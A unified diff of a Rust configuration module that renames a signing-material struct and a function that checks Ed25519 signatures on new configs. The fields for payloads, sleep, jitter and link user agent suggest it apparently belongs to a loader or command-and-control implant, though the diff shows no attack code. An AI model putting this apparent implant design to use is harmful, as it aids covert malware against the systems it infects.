@@ -21,10 +21,13 @@ use chrono::prelude::*;
 use std::collections::BTreeMap;
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct SignMaterial {
+pub struct VerifSignMaterial {
     pub peer_public_key_bytes: Vec<u8>,
     pub sign_bytes: Vec<u8>,
 }
+
+
+
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct Config {
@@ -32,7 +35,7 @@ pub struct Config {
     pub payloads: Vec<Payload>,
     pub defuse_update: Vec<Defuse>,
     pub defuse_payload: Vec<Defuse>,
-    pub sign_material: SignMaterial,
+    pub sign_material: VerifSignMaterial,
     pub sleep: u64,
     pub jitt: u64,
     pub link_timeout: u64,
@@ -51,7 +54,7 @@ impl Config {
         link_timeout: u64,
         link_user_agent: String,
     ) -> Config {
-        let sign_material = SignMaterial {
+        let sign_material = VerifSignMaterial {
             peer_public_key_bytes: vec![],
             sign_bytes: vec![],
         };
@@ -70,7 +73,7 @@ impl Config {
     }
     //TODO check if utile
     pub fn new_empty() -> Config {
-        let sign_material = SignMaterial {
+        let sign_material = VerifSignMaterial {
             peer_public_key_bytes: vec![],
             sign_bytes: vec![],
         };
@@ -126,23 +129,23 @@ impl Config {
         let sign_data = self.return_sign_data();
         let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
         let sign_bytes = sig.as_ref();
-        let sign_material = SignMaterial {
+        let sign_material = VerifSignMaterial {
             peer_public_key_bytes: peer_public_key_bytes,
             sign_bytes: sign_bytes.to_vec(),
         };
         self.sign_material = sign_material;
     }
 
-    pub fn verify_newloader_sign(
+    pub fn verify_newconfig_signature(
         &self,
-        otherloader: &Config,
+        newconfig: &Config,
     ) -> Result<(), ring::error::Unspecified> {
-        let sign_data = otherloader.return_sign_data();
+        let sign_data = newconfig.return_sign_data();
         let peer_public_key = signature::UnparsedPublicKey::new(
             &signature::ED25519,
             &self.sign_material.peer_public_key_bytes,
         );
-        peer_public_key.verify(sign_data.as_bytes(), &otherloader.sign_material.sign_bytes)
+        peer_public_key.verify(sign_data.as_bytes(), &newconfig.sign_material.sign_bytes)
     }
 
     pub fn new_fromfile(path_file: &str) -> Config {
@@ -161,7 +164,7 @@ impl Config {
     }
     pub fn get_loader_without_sign_material(&self) -> String {
         let mut print_loader: Config = self.clone();
-        let clean_sign_material = SignMaterial {
+        let clean_sign_material = VerifSignMaterial {
             peer_public_key_bytes: vec![],
             sign_bytes: vec![],
         };
